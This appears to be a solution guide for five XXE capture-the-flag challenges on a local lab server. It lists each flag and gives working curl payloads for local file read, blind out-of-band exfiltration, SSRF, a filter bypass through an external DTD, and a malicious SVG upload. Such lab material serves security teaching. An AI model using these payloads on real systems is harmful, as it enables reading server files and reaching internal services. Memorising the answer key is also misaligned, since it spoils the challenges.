CHALLENGE 1: Basic XXE — File Read
Flag: FLAG{xx3_f1l3_r34d}

  The /parse endpoint uses lxml with resolve_entities=True.
  Send a basic XXE payload:

  curl -X POST http://localhost:5012/parse \
    -H "Content-Type: application/xml" \
    -d '<?xml version="1.0"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///app/flag.txt">
  ]>
  <data>&xxe;</data>'

  The &xxe; entity is replaced with the contents of /app/flag.txt.

CHALLENGE 2: Blind XXE — Out-of-Band Exfiltration
Flag: FLAG{xx3_bl1nd_00b}

  The /import endpoint parses XML but does NOT display entity values
  in the response (only shows "Import successful" or error).
  Use the /log endpoint for out-of-band exfiltration:

  curl -X POST http://localhost:5012/import \
    -H "Content-Type: application/xml" \
    -d '<?xml version="1.0"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///app/flag2.txt">
    <!ENTITY exfil SYSTEM "http://127.0.0.1:5012/log?data=FLAG_PLACEHOLDER">
  ]>
  <data>&xxe;&exfil;</data>'

  Note: Direct entity chaining may not work for blind XXE.
  Alternative — use parameter entities:

  curl -X POST http://localhost:5012/import \
    -H "Content-Type: application/xml" \
    -d '<?xml version="1.0"?>
  <!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///app/flag2.txt">
    <!ENTITY % exfil SYSTEM "http://127.0.0.1:5012/log?data=%file;">
    %exfil;
  ]>
  <data>test</data>'

  Then check the log:
  curl http://localhost:5012/log-view

CHALLENGE 3: XXE to SSRF
Flag: FLAG{xx3_ssrf_ch41n}

  The /validate endpoint has the same vulnerable parser.
  Use an entity pointing to the internal-only endpoint:

  curl -X POST http://localhost:5012/validate \
    -H "Content-Type: application/xml" \
    -d '<?xml version="1.0"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://127.0.0.1:5012/internal/secret">
  ]>
  <data>&xxe;</data>'

  The entity fetches the internal endpoint (accessible from localhost)
  and the response JSON containing the flag is reflected.

CHALLENGE 4: Filter Bypass — External DTD via PUBLIC
Flag: FLAG{xx3_f1lt3r_byp4ss}

  The /parse-filtered endpoint rejects XML containing the strings
  "SYSTEM" or "ENTITY" (case-sensitive). Bypass by using the PUBLIC
  keyword and referencing the /evil-dtd endpoint:

  curl -X POST http://localhost:5012/parse-filtered \
    -H "Content-Type: application/xml" \
    -d '<?xml version="1.0"?>
  <!DOCTYPE foo PUBLIC "-//test" "http://127.0.0.1:5012/evil-dtd">
  <root>&xxe;</root>'

  The /evil-dtd endpoint returns a DTD containing:
    <!ENTITY xxe SYSTEM "file:///app/flag4.txt">

  This loads the entity definition externally, bypassing the keyword
  filter on the submitted XML body.

CHALLENGE 5: SVG Upload XXE
Flag: FLAG{xx3_svg_1nj3ct}

  The /svg-upload endpoint accepts SVG file uploads and parses them
  as XML (since SVG is XML-based).

  Create a malicious SVG file:

  cat > /tmp/evil.svg << 'EOF'
  <?xml version="1.0"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///app/flag5.txt">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">&xxe;</text>
  </svg>
  EOF

  Upload it:
  curl -F "file=@/tmp/evil.svg" http://localhost:5012/svg-upload

  The parsed text content includes the flag from the entity expansion.
